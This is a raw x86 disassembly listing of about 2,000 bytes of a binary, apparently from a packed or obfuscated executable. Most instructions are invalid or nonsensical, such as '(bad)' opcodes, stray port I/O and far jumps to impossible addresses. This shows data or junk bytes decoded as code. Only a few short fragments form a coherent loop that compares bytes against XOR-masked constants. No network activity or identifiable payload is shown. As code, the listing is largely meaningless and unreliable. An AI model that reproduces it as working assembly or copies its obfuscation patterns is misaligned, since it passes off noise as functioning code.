  407fcd:	dec    edi
  407fce:	jmp    0xefc977fa
  407fd3:	daa    
  407fd4:	lea    eax,[esi]
  407fd6:	xchg   DWORD PTR [ecx],edi
  407fd8:	(bad)
  407fdc:	push   0x51
  407fde:	mov    eax,ds:0x22309ade
  407fe3:	lds    ebp,FWORD PTR es:[esi+0x5c]
  407fe7:	fbld   TBYTE PTR [eax+edx*8+0x589ec3a9]
  407fee:	sbb    esi,ecx
  407ff0:	mov    ?,ebp
  407ff2:	out    0xb,eax
  407ff4:	inc    ebp
  407ff5:	inc    ebp
  407ff6:	pop    ecx
  407ff7:	or     DWORD PTR [eax+0x1a89c9f1],esi
  407ffd:	je     0x408020
  407fff:	sbb    al,0xb7
  408001:	ret    
  408002:	outs   dx,BYTE PTR ds:[esi]
  408003:	add    DWORD PTR [eax],ebx
  408005:	ror    DWORD PTR [edi+0x52],0xdb
  408009:	das    
  40800a:	mov    dl,0x8c
  40800c:	mov    WORD PTR [ecx+0x544210f5],ss
  408012:	pop    ebx
  408013:	and    al,0x78
  408015:	mov    al,0xc7
  408017:	test   BYTE PTR [esi+0x5a6b8d7c],bh
  40801d:	rcr    dh,1
  40801f:	add    ebp,DWORD PTR [edx]
  408021:	nop
  408022:	push   ebp
  408023:	sub    eax,0xd94751b1
  408028:	(bad)  
  408029:	repnz enter 0x7bc1,0x38
  40802e:	adc    ah,BYTE PTR [edi]
  408030:	nop
  408031:	add    al,0x6e
  408033:	sub    esi,DWORD PTR [edx-0x5bb6ba91]
  408039:	mov    edi,0x5424f03c
  40803e:	loop   0x408043
  408040:	scas   eax,DWORD PTR es:[edi]
  408041:	mov    al,ds:0xd21f35dc
  408046:	add    BYTE PTR [ebx+0x48a0fca0],cl
  40804c:	scas   al,BYTE PTR es:[di]
  40804e:	mov    al,ds:0xc19e8f05
  408053:	inc    esi
  408054:	adc    eax,0x1b7e3686
  408059:	hlt    
  40805a:	jnp    0x40800f
  40805c:	mul    BYTE PTR [ecx]
  40805e:	adc    al,0xaf
  408060:	rsqrtps xmm7,XMMWORD PTR [ecx]
  408063:	or     al,0xa2
  408065:	mov    eax,ds:0xce579e31
  40806a:	sub    eax,0x7c9dc522
  40806f:	int    0x3d
  408071:	mov    ds:0xd1e9a1d7,al
  408076:	push   cs
  408077:	jmp    0x4080df
  408079:	retf   0xaaae
  40807c:	iret   
  40807d:	repz push es
  40807f:	je     0x40809a
  408081:	add    DWORD PTR [edi+0x7cccc350],ebp
  408087:	xchg   edi,eax
  408088:	es cwde 
  40808a:	sahf   
  40808b:	dec    ebx
  40808c:	pop    ecx
  40808d:	sub    BYTE PTR [ebx-0x73],0xc4
  408091:	pop    esp
  408092:	jge    0x408033
  408094:	sti    
  408095:	adc    al,0x6f
  408097:	mov    ebp,0x6b48c6cf
  40809c:	xchg   edi,eax
  40809d:	cld    
  40809e:	sub    BYTE PTR [ebx-0x56a0ef1b],0xd5
  4080a5:	or     esi,DWORD PTR [esi]
  4080a7:	sub    bl,bl
  4080a9:	(bad)  
  4080ab:	out    0x7b,al
  4080ad:	test   al,0x12
  4080af:	dec    edi
  4080b0:	mov    ecx,0x45a3a771
  4080b5:	rcr    BYTE PTR ds:0x5e37057b,cl
  4080bb:	hlt    
  4080bc:	mov    ah,0x44
  4080be:	stos   BYTE PTR es:[edi],al
  4080bf:	call   0xaebc5935
  4080c4:	fmul   QWORD PTR [edx]
  4080c6:	sub    al,0x97
  4080c8:	add    edi,eax
  4080ca:	int3   
  4080cb:	mov    ecx,0x70e5c306
  4080d0:	xor    eax,0xc603c133
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx+0x73273975],eax
  4080f8:	jge    0x4080ee
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x40813f
  408102:	lods   al,BYTE PTR ds:[esi]
  408103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408104:	jecxz  0x408128
  408106:	retf   
  408107:	cdq    
  408108:	sub    DWORD PTR [edi-0x50],ebp
  40810b:	dec    esp
  40810c:	sub    eax,0x5b328b3e
  408111:	or     eax,0x7b4a635a
  408116:	ins    DWORD PTR es:[edi],dx
  408117:	addr16 mov ch,0xff
  40811a:	adc    ebx,DWORD PTR [edi+0x3]
  40811d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40811e:	pop    es
  40811f:	jae    0x4080d9
  408121:	or     eax,0xa6b2efe7
  408126:	pop    ds
  408127:	fnsave [ebx]
  408129:	jnp    0x4080f3
  40812b:	xor    DWORD PTR [ebp+0x4c0961bd],0xffffffb1
  408132:	xlat   BYTE PTR ds:[ebx]
  408133:	jmp    0xe3b23977
  408138:	pushf  
  408139:	cmp    eax,0xeb91e5f8
  40813e:	lods   eax,DWORD PTR ds:[esi]
  40813f:	add    ch,BYTE PTR [edx+0x0]
  408142:	fild   DWORD PTR ds:0x3632637f
  408148:	mov    BYTE PTR [esp+esi*1],ch
  40814b:	(bad)  
  40814c:	mov    DWORD PTR [ebp+0xcbcba8d],0x433675e0
  408156:	jno    0x4081bc
  408158:	xor    ah,BYTE PTR [esi-0x39]
  40815b:	call   edx
  40815d:	add    al,0x8a
  40815f:	cdq    
  408160:	mov    DWORD PTR [edx+esi*4+0x63],edi
  408164:	cld    
  408165:	or     edx,ebx
  408167:	cld    
  408168:	jecxz  0x4080f2
  40816a:	pusha  
  40816b:	and    cl,0x2c
  40816e:	push   ds
  40816f:	sub    BYTE PTR [esi+0x10],0x59
  408173:	mov    ds:0x900f4dd0,eax
  408178:	das    
  408179:	jle    0x40819b
  40817b:	clc    
  40817c:	fadd   DWORD PTR [edi+0x61]
  40817f:	push   ecx
  408180:	cmp    BYTE PTR [edx],dh
  408182:	rol    BYTE PTR [edx-0x4203e3b9],cl
  408188:	sbb    al,0x48
  40818a:	fist   WORD PTR [ecx]
  40818c:	std    
  40818d:	cmp    DWORD PTR [eax],0xffffffbc
  408190:	add    BYTE PTR [ebp-0x37],cl
  408193:	leave  
  408194:	and    al,0xb3
  408196:	imul   eax,edx,0xffffffca
  408199:	(bad)  
  40819a:	nop
  40819b:	out    dx,eax
  40819c:	pop    es
  40819d:	sbb    DWORD PTR [ebx+esi*2-0x205b0c26],0x9f26714a
  4081a8:	add    ecx,DWORD PTR [edi+0x13]
  4081ab:	xchg   ebp,eax
  4081ac:	adc    esp,DWORD PTR [ebx+0x42df15bd]
  4081b2:	cmp    al,0x5c
  4081b4:	repz add eax,0xf5f4827
  4081ba:	ins    BYTE PTR es:[edi],dx
  4081bb:	pop    ecx
  4081bc:	bound  eax,QWORD PTR [edx-0x3b]
  4081bf:	inc    edx
  4081c0:	stos   DWORD PTR es:[edi],eax
  4081c1:	mov    WORD PTR [esp+ebx*2+0x7ee42d42],es
  4081c8:	xlat   BYTE PTR ds:[ebx]
  4081c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081ca:	sbb    eax,0x5c61469e
  4081cf:	jns    0x408235
  4081d1:	mov    ds:0x2ba7967a,al
  4081d6:	mov    ah,0x79
  4081d8:	mov    BYTE PTR ds:0x3ea4c2b1,dh
  4081de:	dec    ecx
  4081df:	mov    cl,0xce
  4081e1:	aas    
  4081e2:	mov    edi,0x6da0be0f
  4081e7:	adc    DWORD PTR [ecx+0x2382bd89],ebx
  4081ed:	and    cl,BYTE PTR [eax+ecx*2-0x1873ccbd]
  4081f4:	mov    edi,0x2f76fe1
  4081f9:	rcr    BYTE PTR es:[esi],1
  4081fc:	fimul  DWORD PTR [eax-0x14216fc2]
  408202:	clc    
  408203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408204:	xchg   ebp,eax
  408205:	repz jle 0x408193
  408208:	and    BYTE PTR [edx+0x6f],dh
  40820b:	pusha  
  40820c:	jne    0x408212
  40820e:	pop    esi
  40820f:	adc    al,0x2b
  408211:	fwait
  408212:	xor    DWORD PTR [edx+esi*4-0x53da435b],esi
  408219:	add    eax,0x4367ff0b
  40821e:	cmc    
  40821f:	or     BYTE PTR [ecx],ah
  408221:	adc    DWORD PTR [ebp-0x4b],ecx
  408224:	fistp  DWORD PTR [ebp+ebx*2-0x280e01da]
  40822b:	ror    DWORD PTR [edx+0x2e],0x14
  40822f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408230:	rcl    esp,0x41
  408233:	cmp    dl,BYTE PTR [ebx]
  408235:	mov    bl,0x40
  408237:	pop    esi
  408238:	mov    ?,WORD PTR [ebx-0x3b]
  40823b:	jle    0x4081c5
  40823d:	imul   esi,DWORD PTR [eax-0x73e4c14c],0x8303f74
  408247:	mov    bl,0x23
  408249:	imul   ebx,DWORD PTR [ebx-0x3a842dcc],0xffffffbd
  408250:	dec    esi
  408251:	sar    BYTE PTR [eax],0xa5
  408254:	mov    WORD PTR [edi-0x16558c3e],fs
  40825a:	call   0x7a33:0x3ff9077a
  408261:	lock test eax,0x43df2c56
  408267:	pop    ebx
  408268:	jo     0x408218
  40826a:	mov    bh,0x1b
  40826c:	arpl   WORD PTR [eax-0x24],sp
  40826f:	mov    ah,0x87
  408271:	add    bh,ah
  408273:	pop    ebx
  408274:	pop    ss
  408275:	mov    ebx,fs
  408277:	or     cl,dh
  408279:	pop    ss
  40827a:	test   DWORD PTR [edi-0x363d2fe5],edx
  408280:	and    DWORD PTR [eax],0x46
  408283:	xlat   BYTE PTR ds:[ebx]
  408284:	repnz sbb dh,BYTE PTR [ebx+0xe]
  408288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408289:	and    ebp,ebx
  40828b:	add    BYTE PTR [ecx+0x6d],dl
  40828e:	jnp    0x40821f
  408290:	dec    esi
  408291:	loop   0x408234
  408293:	mov    bh,0x9a
  408295:	out    0xfa,eax
  408297:	sub    edi,DWORD PTR [ebx]
  408299:	test   DWORD PTR [ecx+ebp*1+0x10],edi
  40829d:	inc    bh
  40829f:	stos   BYTE PTR es:[edi],al
  4082a0:	adc    eax,0x2597cc41
  4082a5:	mov    fs,WORD PTR [esi]
  4082a7:	shl    DWORD PTR [eax-0x6c],cl
  4082aa:	ret    0x71b3
  4082ad:	pop    DWORD PTR [ecx+0x4dbe89b9]
  4082b3:	mov    cl,0xb9
  4082b5:	imul   esp,DWORD PTR [esi-0x5],0xffffffb1
  4082b9:	hlt    
  4082ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082bb:	sub    eax,0x766811c9
  4082c0:	or     al,0xe5
  4082c2:	mov    al,ds:0x5607e04d
  4082c7:	(bad)  
  4082c8:	jmp    0xd5ed:0x14a202a6
  4082cf:	jecxz  0x408305
  4082d1:	or     eax,0xa6b86b5b
  4082d6:	pop    esp
  4082d7:	add    bl,BYTE PTR [ebx-0xb1a56a6]
  4082dd:	je     0x408271
  4082df:	sbb    DWORD PTR [esi],ebp
  4082e1:	cli    
  4082e2:	ins    BYTE PTR es:[edi],dx
  4082e3:	mov    al,ds:0xf89e53a1
  4082e8:	mov    BYTE PTR [ecx-0x56cc3b11],ah
  4082ee:	add    eax,0x204499ee
  4082f3:	sbb    BYTE PTR [esi+0x37462ade],0x45
  4082fa:	clc    
  4082fb:	xor    eax,0x9f5f2d18
  408300:	ss push ebx
  408302:	cmp    DWORD PTR [edx+ebp*8-0x3],ebp
  408306:	mov    edi,0x3f5ed4e3
  40830b:	ins    BYTE PTR es:[edi],dx
  40830c:	call   0xb1e4:0x32287d67
  408313:	xchg   BYTE PTR [ebp+0x2],bl
  408316:	mov    bh,0x83
  408318:	retf   
  408319:	sbb    DWORD PTR [eax+0x16a77881],edi
  40831f:	pop    esi
  408320:	imul   edi,DWORD PTR [ebx+0x23a3797c],0x35
  408327:	inc    dh
  408329:	dec    ecx
  40832a:	ficom  WORD PTR ds:0xa0fd67c7
  408330:	cmp    al,bh
  408332:	and    al,0x6a
  408334:	push   0x531a99e8
  408339:	xchg   ecx,eax
  40833a:	shr    edi,0xd8
  40833d:	hlt    
  40833e:	div    DWORD PTR [eax+0x57c8ca78]
  408344:	dec    ecx
  408345:	dec    edi
  408346:	mov    eax,ds:0x23880055
  40834b:	js     0x4082e8
  40834d:	cli    
  40834e:	sbb    DWORD PTR [ebx],esi
  408350:	fnstcw WORD PTR [eax]
  408352:	out    0x42,eax
  408354:	rol    BYTE PTR [ebx-0x43],cl
  408357:	xchg   edx,eax
  408358:	dec    ecx
  408359:	loope  0x4083a5
  40835b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40835c:	or     al,0xcc
  40835e:	sub    al,0xfe
  408360:	dec    ebp
  408361:	cwde   
  408362:	sub    al,0xd4
  408364:	mov    ebp,0x2dfe4a08
  408369:	jmp    0x4083da
  40836b:	sbb    dh,bh
  40836d:	jbe    0x408337
  40836f:	daa    
  408370:	imul   ebp,DWORD PTR [edx+0x7b],0x1a
  408374:	(bad)  
  408375:	add    bl,BYTE PTR [edx+0x6c]
  408378:	mov    ch,0x1a
  40837a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40837b:	loope  0x408386
  40837d:	and    BYTE PTR [ecx-0x394b6b9c],dl
  408383:	xor    DWORD PTR [esi-0x411812f3],0x6010ff28
  40838d:	arpl   WORD PTR [ebx-0x34],bx
  408390:	jmp    edi
  408392:	lea    esi,[edi-0x7f0411c0]
  408398:	sub    eax,DWORD PTR [eax+0x15]
  40839b:	mov    ebx,0x9708c99d
  4083a0:	and    BYTE PTR [edx+0x5f2ce864],ch
  4083a6:	loope  0x40834f
  4083a8:	addr16 cmp eax,0x7d648796
  4083ae:	imul   edi,edx,0xffffff9b
  4083b1:	mov    ebx,0x1551c6e4
  4083b6:	ror    BYTE PTR [ecx],cl
  4083b8:	enter  0x5c18,0x61
  4083bc:	mov    al,ds:0x9649ed9a
  4083c1:	jno    0x408402
  4083c3:	std    
  4083c4:	lods   al,BYTE PTR ds:[esi]
  4083c5:	iret   
  4083c6:	dec    ebx
  4083c7:	push   eax
  4083c8:	shl    DWORD PTR [eax-0x12199f50],cl
  4083ce:	loope  0x408383
  4083d0:	adc    al,0x82
  4083d2:	bound  ebp,QWORD PTR [ebx-0x27]
  4083d5:	loope  0x408377
  4083d7:	arpl   WORD PTR [esi],dx
  4083d9:	push   edx
  4083da:	scas   al,BYTE PTR es:[edi]
  4083db:	iret   
  4083dc:	idiv   BYTE PTR [edx]
  4083de:	jbe    0x4083c2
  4083e0:	push   esi
  4083e1:	hlt    
  4083e2:	jo     0x40839a
  4083e4:	fwait
  4083e5:	leave  
  4083e6:	jmp    0xf994:0x170e5eb
  4083ed:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4083f1:	mov    dl,BYTE PTR [ebp-0x1]
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi+0x1f2c95b3],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x40846c
  408448:	mov    ?,eax
  40844a:	loopne 0x4083ce
  40844c:	pop    esi
  40844d:	sbb    al,0x25
  40844f:	fcmovbe st,st(2)
  408451:	adc    al,0x97
  408453:	cmp    BYTE PTR [esi*8-0x7532fd0b],ah
  40845a:	xlat   BYTE PTR ds:[ebx]
  40845b:	fnsave [ebp+0x4e560bd8]
  408461:	or     ebp,DWORD PTR [edi+edi*2+0x56]
  408465:	pop    ecx
  408466:	(bad)  
  408467:	test   al,0x4f
  408469:	inc    ebp
  40846a:	dec    ebx
  40846b:	jb     0x4084a4
  40846d:	pop    es
  40846e:	pop    ebp
  40846f:	in     al,0xc4
  408471:	jge    0x408482
  408473:	and    eax,0xf2e811a2
  408478:	cmp    DWORD PTR [ebx],esi
  40847a:	mov    ch,0xd4
  40847c:	(bad)  [edx+ecx*4]
  40847f:	cmp    al,BYTE PTR [edi+0x4ca1dc0f]
  408485:	std    
  408486:	add    edx,DWORD PTR [edx]
  408488:	out    dx,eax
  408489:	in     eax,dx
  40848a:	sbb    cl,BYTE PTR [edx-0x1a233f28]
  408490:	inc    edx
  408491:	cld    
  408492:	or     ecx,DWORD PTR [esp+esi*2]
  408495:	sbb    BYTE PTR ds:0xcfb90ca7,bh
  40849b:	and    DWORD PTR [eax+0x19],ebx
  40849e:	xchg   ebx,eax
  40849f:	inc    ecx
  4084a0:	je     0x408509
  4084a2:	mov    ecx,DWORD PTR [ebx-0x5f]
  4084a5:	mov    edx,esi
  4084a7:	mov    esi,0xe091887
  4084ac:	or     esp,DWORD PTR ds:0x8568c70b
  4084b2:	push   edi
  4084b3:	mov    eax,ds:0xf80f3382
  4084b8:	out    dx,eax
  4084b9:	push   edx
  4084ba:	push   eax
  4084bb:	imul   ebp,ecx,0x6b1e7438
  4084c1:	jno    0x408465
  4084c3:	or     DWORD PTR [edx],edx
  4084c5:	mov    ds:0x2e1825a3,eax
  4084ca:	(bad)  
  4084cb:	pop    ss
  4084cc:	(bad)  
  4084cd:	mov    edi,0x55c14456
  4084d2:	mov    al,BYTE PTR [eax]
  4084d4:	repnz inc edi
  4084d6:	icebp  
  4084d7:	fwait
  4084d8:	mov    ebp,0x21a7785e
  4084dd:	pop    ebx
  4084de:	aad    0x7e
  4084e0:	xor    al,0xef
  4084e2:	and    eax,0x132eeac0
  4084e7:	cld    
  4084e8:	cmp    cl,BYTE PTR [ecx+0x9]
  4084eb:	or     eax,0x54e5c06d
  4084f0:	or     BYTE PTR [edx+0x22],al
  4084f3:	data16 data16 sbb BYTE PTR [ebx+0x18fab812],0x88
  4084fc:	sbb    al,0x54
  4084fe:	aaa    
  4084ff:	fst    DWORD PTR [esp+edi*2]
  408502:	xor    BYTE PTR ds:0xeb6a7302,dl
  408508:	or     esp,DWORD PTR [edi-0x2f]
  40850b:	fs pop ebx
  40850d:	fnstenv [eax+esi*8-0x33]
  408511:	out    dx,al
  408512:	ss inc ebp
  408514:	stos   BYTE PTR es:[edi],al
  408515:	push   esp
  408516:	xor    al,bh
  408518:	push   cs
  408519:	jl     0x4084fb
  40851b:	ins    DWORD PTR es:[edi],dx
  40851c:	aad    0x90
  40851e:	mov    ?,WORD PTR [edi]
  408520:	icebp  
  408521:	mov    dl,BYTE PTR [ebp-0x26fafb0d]
  408527:	das    
  408528:	adc    al,0x6c
  40852a:	cdq    
  40852b:	enter  0x8ebe,0x59
  40852f:	cmp    al,0xa3
  408531:	mov    eax,0xff61df35
  408536:	add    DWORD PTR [eax+0x3edd9ed3],edi
  40853c:	cmp    DWORD PTR [edx-0x7a378d15],eax
  408542:	or     BYTE PTR [edi+0x1a],al
  408545:	or     BYTE PTR ds:[ebx],al
  408548:	int3   
  408549:	fdivr  DWORD PTR [ebx+eiz*8-0x6546529a]
  408550:	xor    edi,esi
  408552:	je     0x408523
  408554:	pop    ebp
  408555:	scas   eax,DWORD PTR es:[edi]
  408556:	sbb    ch,cl
  408558:	push   0xe3347a1
  40855d:	test   ebx,esi
  40855f:	scas   eax,DWORD PTR es:[edi]
  408560:	daa    
  408561:	dec    edx
  408562:	inc    edx
  408563:	push   ss
  408564:	jo     0x408562
  408566:	jae    0x408516
  408568:	repnz add eax,0x9fa530d6
  40856e:	mov    eax,DWORD PTR [ebp-0x754c8a0a]
  408574:	mov    ebp,0x8a2fac28
  408579:	sbb    dl,BYTE PTR [ebp+0x38cd8930]
  40857f:	xor    eax,DWORD PTR [ebx+0x320d8190]
  408585:	call   0xe9a6a147
  40858a:	push   ss
  40858b:	or     esi,DWORD PTR [esp+esi*8]
  40858e:	dec    edi
  40858f:	jb     0x408574
  408591:	inc    ebp
  408592:	jmp    0x4085ed
  408594:	retf   
  408595:	lock (bad) 
  408597:	test   al,0x7d
  408599:	sub    eax,DWORD PTR [ebx-0x47]
  40859c:	add    eax,0x68925bdb
  4085a1:	mov    ch,0xf1
  4085a3:	arpl   sp,si
  4085a5:	mov    dl,0xc
  4085a7:	leave  
  4085a8:	in     eax,dx
  4085a9:	and    edx,DWORD PTR [edx]
  4085ab:	scas   al,BYTE PTR es:[di]
  4085ad:	inc    ecx
  4085ae:	fs jmp 0x40858f
  4085b1:	sub    al,0x6e
  4085b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085b4:	xchg   ebx,eax
  4085b5:	jmp    0x4085a1
  4085b7:	cmc    
  4085b8:	dec    esi
  4085b9:	xchg   ecx,eax
  4085ba:	mov    esp,0x5c393b76
  4085bf:	cmp    al,0xf
  4085c1:	cs enter 0xf721,0xc1
  4085c6:	lahf   
  4085c7:	push   edx
  4085c8:	jmp    0x224f:0xf63bc7ad
  4085cf:	xor    ch,ch
  4085d1:	jle    0x408586
  4085d3:	cs mov esp,0x45c0950f
  4085d9:	outs   dx,BYTE PTR ds:[esi]
  4085da:	jnp    0x4085d2
  4085dc:	mov    al,ds:0xecee66ee
  4085e1:	ja     0x408593
  4085e3:	add    al,0x6b
  4085e5:	cs out dx,eax
  4085e7:	cmp    eax,0x42d7f00d
  4085ec:	popf   
  4085ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ee:	pop    es
  4085ef:	jmp    0xe3f1fb51
  4085f4:	pop    eax
  4085f5:	sahf   
  4085f6:	cli    
  4085f7:	and    eax,0x911c7691
  4085fc:	or     esp,DWORD PTR [edi+0x27f6b5f9]
  408602:	or     eax,0x8e8da08e
  408607:	mov    cl,0xdf
  408609:	mov    ebx,0xab073a57
  40860e:	sub    eax,0xe662cec
  408613:	addr16 (bad) 
  408615:	pop    eax
  408616:	ficomp WORD PTR [edx+0x0]
  408619:	mov    ah,0x6a
  40861b:	fisub  WORD PTR [ebx]
  40861d:	out    0xc1,eax
  40861f:	xor    DWORD PTR [edi+esi*8+0xdce15fa],esp
  408626:	data16 icebp 
  408628:	loope  0x408645
  40862a:	sub    eax,0x61546a88
  40862f:	inc    esp
  408630:	add    eax,0xe7de0c56
  408635:	sbb    esi,DWORD PTR [esi-0x3d]
  408638:	dec    ebp
  408639:	popf   
  40863a:	push   ebx
  40863b:	mov    esi,0xbc953ff2
  408640:	in     al,0x99
  408642:	mov    eax,0xf709527a
  408647:	xchg   edx,eax
  408648:	or     al,0x2c
  40864a:	jg     0x4086b8
  40864c:	push   cs
  40864d:	inc    eax
  40864e:	or     eax,0x18a43b85
  408653:	fcomp  QWORD PTR [ecx-0x3d1e3d14]
  408659:	jb     0x40868e
  40865b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40865c:	xor    eax,0xd64cb9f0
  408661:	push   es
  408662:	jmp    0x499e:0xe5675fc5
  408669:	lods   eax,DWORD PTR ds:[esi]
  40866a:	dec    edx
  40866b:	fistp  DWORD PTR ds:0x7f8396b3
  408671:	cmp    esp,DWORD PTR [ebp+0x3c99a841]
  408677:	xlat   BYTE PTR ds:[ebx]
  408678:	repnz xchg ebp,eax
  40867a:	xchg   ebx,eax
  40867b:	add    bh,al
  40867d:	jmp    DWORD PTR [eax-0x11]
  408680:	(bad)  
  408681:	mov    esi,0xe19c468c
  408686:	push   ss
  408687:	mov    ch,0x89
  408689:	dec    ecx
  40868a:	pushf  
  40868b:	popa   
  40868c:	inc    edx
  40868d:	fidivr DWORD PTR [ebx]
  40868f:	jno    0x40870d
  408691:	and    ah,0xf6
  408694:	pop    edx
  408695:	xchg   edi,eax
  408696:	mov    bl,dh
  408698:	mov    edx,0x50b295ad
  40869e:	xlat   BYTE PTR ds:[ebx]
  40869f:	pop    ebp
  4086a0:	dec    ebx
  4086a1:	fimul  DWORD PTR [edi+esi*1-0x79a5da29]
  4086a8:	psadbw mm3,mm3
  4086ab:	push   edi
  4086ac:	mov    esi,edi
  4086ae:	sub    BYTE PTR [eax*2-0x23acea1b],bh
  4086b5:	sbb    al,0x16
  4086b7:	push   cs
  4086b8:	push   ecx
  4086b9:	mov    ah,0x9a
  4086bb:	jbe    0x408664
  4086bd:	push   es
  4086be:	fmulp  st(4),st
  4086c0:	inc    eax
  4086c1:	add    DWORD PTR [ecx],0xfffffffe
  4086c4:	xchg   BYTE PTR [edi],bl
  4086c6:	retf   
  4086c7:	dec    ecx
  4086c8:	cdq    
  4086c9:	rol    edx,0x65
  4086cc:	sub    dl,BYTE PTR [ebp-0x3d]
  4086cf:	inc    esi
  4086d0:	jp     0x40874c
  4086d2:	pop    esi
  4086d3:	stos   DWORD PTR es:[edi],eax
  4086d4:	(bad)  
  4086d5:	mov    ds:0x67764289,al
  4086da:	sbb    al,ch
  4086dc:	sar    eax,0x5
  4086df:	std    
  4086e0:	es cmc 
  4086e2:	shl    ecx,1
  4086e4:	in     eax,0x59
  4086e6:	scas   eax,DWORD PTR es:[edi]
  4086e7:	pop    eax
  4086e8:	sbb    dl,BYTE PTR [eax+0x1a]
  4086eb:	push   ebx
  4086ec:	pop    ds
  4086ed:	loope  0x408674
  4086ef:	iret   
  4086f0:	mov    edx,0x9cf957d0
  4086f5:	ret    0xeb21
  4086f8:	sbb    eax,0x781a3bc1
  4086fd:	push   0x2a6daf2a
  408702:	jb     0x4086b5
  408704:	fld    TBYTE PTR [edx]
  408706:	ins    DWORD PTR es:[edi],dx
  408707:	ins    DWORD PTR es:[edi],dx
  408708:	daa    
  408709:	popf   
  40870a:	mov    eax,DWORD PTR [ecx]
  40870c:	ror    esi,1
  40870e:	ds rcl cl,1
  408711:	jecxz  0x4086e8
  408713:	and    al,0x4e
  408715:	out    dx,al
  408716:	mov    eax,0xf88707c9
  40871b:	fdivr  DWORD PTR [ecx+0x4]
  40871e:	fistp  WORD PTR [edi-0x444869f5]
  408724:	ins    DWORD PTR es:[edi],dx
  408725:	mov    ebp,0x396428ab
  40872a:	popf   
  40872b:	(bad)  
  40872c:	popa   
  40872d:	test   ah,dl
  40872f:	mov    dl,0x40
  408731:	lods   eax,DWORD PTR ds:[esi]
  408732:	(bad)  
  408733:	lea    eax,[ebp-0x18]
  408736:	mov    DWORD PTR [ebp-0x14],eax
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	adc    eax,0xcc9de140
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x40875f
  408784:	mov    ah,0xe5
  408786:	jns    0x40871d
  408788:	adc    ah,dl
  40878a:	jo     0x408774
  40878c:	scas   eax,DWORD PTR es:[edi]
  40878d:	cmp    eax,0xf9ecdb42
  408792:	dec    ecx
  408793:	rol    DWORD PTR fs:[edi+0x1caf82e2],cl
  40879a:	sub    BYTE PTR [eax+0x778bc5f8],bh
  4087a0:	add    eax,0xa64c181
  4087a5:	xor    cl,BYTE PTR [edx]
  4087a7:	out    0xc6,eax
  4087a9:	call   0xe4a4640e
  4087ae:	hlt    
  4087af:	jmp    ebx
  4087b1:	out    0xba,eax
  4087b3:	inc    esp
  4087b4:	scas   al,BYTE PTR es:[edi]
  4087b5:	mov    ebp,0x9755962
  4087ba:	call   0xe1b0:0xd9762a6e
  4087c1:	outs   dx,DWORD PTR ds:[esi]
  4087c2:	cwde   
  4087c3:	cmp    eax,0xb20c33f6
  4087c8:	ffree  st(5)
  4087ca:	lock jns 0x710e45f3
  4087d1:	bound  eax,QWORD PTR [edx]
  4087d3:	lods   al,BYTE PTR ds:[esi]
  4087d4:	out    0xcc,eax
  4087d6:	mov    eax,0x2bd480d4
  4087db:	loope  0x4087be
  4087dd:	popa   
  4087de:	retf   
  4087df:	pop    edx
  4087e0:	jmp    0x1dfc:0xc016aca7
  4087e7:	or     bl,BYTE PTR [ebx+0x44]
  4087ea:	js     0x408857
  4087ec:	or     ebp,0xffffffa4
  4087ef:	repz test ch,bl
  4087f2:	(bad)  
  4087f3:	sti    
  4087f4:	and    al,0x49
  4087f6:	mov    dh,BYTE PTR [eax+0x209d4906]
  4087fc:	mov    dh,0x28
  4087fe:	pop    es
  4087ff:	jo     0x408858
